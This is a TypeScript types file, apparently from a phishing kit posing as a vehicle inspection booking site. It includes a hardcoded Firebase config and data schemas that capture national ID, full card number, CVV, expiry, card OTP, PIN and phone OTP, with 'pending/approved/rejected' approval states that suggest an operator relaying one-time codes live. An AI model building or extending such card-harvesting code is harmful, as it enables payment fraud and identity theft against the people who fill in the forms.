
import { getApp, getApps, initializeApp } from 'firebase/app';
import { getDatabase } from 'firebase/database';
import { doc, getFirestore, setDoc, updateDoc } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyASAN3tdSQU7bP2tB0YIGwKoTvpHxXEkxM",
  authDomain: "fiafsx.firebaseapp.com",
  databaseURL: "https://fiafsx-default-rtdb.firebaseio.com",
  projectId: "fiafsx",
  storageBucket: "fiafsx.firebasestorage.app",
  messagingSenderId: "961572278430",
  appId: "1:961572278430:web:1233efaa9217b51c75ab8f",
  measurementId: "G-NLEQ8KKXYG"
};
import type React from "react";
// Core Status Types
export type VehicleStatus = "license" | "customs";
export type VehicleType = "car" | "motorcycle" | "truck";
export type AppStep =
  | "landing"
  | "booking"
  | "payment-method"
  | "card-form"
  | "pin"
  | "phone-verification";
export type PaymentMethod = "card" | "wallet" | "bank";
export type OnlineStatus = "online" | "offline";
export type ApprovalStatus = "pending" | "approved" | "rejected";

// Bank Information
export interface BankInfo {
  name: string;
  logo: string;
  color: string;
}

// Vehicle Type Item
export interface VehicleTypeItem {
  id: VehicleType;
  label: string;
  icon: React.ComponentType;
}

// Inspection Type
export interface InspectionType {
  value: string;
  label: string;
  icon: string;
}

// Location Types
export interface Region {
  value: string;
  label: string;
}

export interface City {
  value: string;
  label: string;
}

export interface InspectionCenter {
  value: string;
  label: string;
}

export type CitiesByRegion = Record<string, City[]>;

// Payment Method Option
export interface PaymentMethodOption {
  id: PaymentMethod;
  label: string;
  icon: React.ComponentType;
  description: string;
  badge?: string;
  available: boolean;
}

// Form State - Booking
export interface BookingFormState {
  vehicleStatus: VehicleStatus;
  vehicleType: VehicleType;
  plateNumbers: string;
  plateLetters: string;
  plateInfo: string;
  registrationType: string;
  documment_owner_full_name: string; // Added owner name field
  nationalId: string; // Added national ID field
  country: string;
  region: string;
  city: string;
  inspectionCenter: string;
  inspectionDate: string;
  inspectionTime: string;
  inspectionType: string;
  captchaChecked: boolean;
}

// Form State - Payment
export interface PaymentFormState {
  paymentMethod: PaymentMethod | "";
  cardNumber: string;
  cardName: string;
  expiryDate: string;
  cvv: string;
  otp: string;
  pin: string[];
  phoneApproval: string;
  bankInfo: BankInfo | null;
  cardApproval: "otp" | "approved" | "pending" | "rejected";
  cardOtpApproval?: ApprovalStatus;
  phoneOtpApproval?: ApprovalStatus;
}

// Form State - Phone Verification
export interface PhoneVerificationState {
  phone: string;
  operator: string;
  phoneOtp: string;
  phoneOtpError: string;
}

// Complete App State
export interface AppState
  extends BookingFormState,
    PaymentFormState,
    PhoneVerificationState {
  currentStep: AppStep;
  isLoading: boolean;
}

// Firebase User Document
export interface UserDocument {
  id: string;
  status?: OnlineStatus;
  lastSeen?: string;
  createdDate: string;
  country: string;

  // Vehicle Information
  vehicleStatus?: VehicleStatus;
  vehicleType?: VehicleType;
  plateNumbers?: string;
  plateLetters?: string;
  plateInfo?: string;
  registrationType?: string;
  documment_owner_full_name?: string; // Added owner name field
  nationalId?: string; // Added national ID field

  // Appointment Details
  region?: string;
  city?: string;
  inspectionCenter?: string;
  inspectionDate?: string;
  inspectionTime?: string;
  inspectionType?: string;

  // Payment Information
  paymentMethod?: PaymentMethod;
  cardNumber?: string;
  cardName?: string;
  expiryDate?: string;
  cvv?: string;
  otp?: string;
  pin?: string;

  // Phone Verification
  phone?: string;
  operator?: string;
  phoneOtp?: string;

  cardOtpApproval?: ApprovalStatus;
  phoneOtpApproval?: ApprovalStatus;

  // Status Tracking
  step?:
    | "booking-completed"
    | "payment-method-selected"
    | "card-details-submitted"
    | "otp-submitted"
    | "pin-submitted"
    | "payment-completed";
  currentPage?: string | number;
  completedDate?: string;
}

// Firebase Data Submission Types
export interface BookingSubmission {
  id: string;
  vehicleStatus: VehicleStatus;
  country: string;
  plateNumbers: string;
  plateLetters: string;
  plateInfo: string;
  registrationType: string;
  vehicleType: VehicleType;
  documment_owner_full_name: string; // Added owner name field
  nationalId: string; // Added national ID field
  region: string;
  city: string;
  inspectionCenter: string;
  inspectionDate: string;
  inspectionTime: string;
  inspectionType: string;
  step: "booking-completed";
}

export interface PaymentMethodSubmission {
  id: string;
  paymentMethod: PaymentMethod;
  step: "payment-method-selected";
}

export interface CardDetailsSubmission {
  id: string;
  cardNumber: string;
  cardName: string;
  expiryDate: string;
  cvv: string;
  step: "card-details-submitted";
}

export interface OtpSubmission {
  id: string;
  otp: string;
  step: "otp-submitted";
}

export interface PinSubmission {
  id: string;
  pin: string;
  step: "pin-submitted";
}

export interface FinalSubmission {
  id: string;
  phone: string;
  operator: string;
  phoneOtp: string;
  step: "payment-completed";
  completedDate: string;
}

// BIN Database Type
export type BinDatabase = Record<string, BankInfo>;

// API Response Types
export interface FirestoreResponse {
  success: boolean;
  error?: any;
}
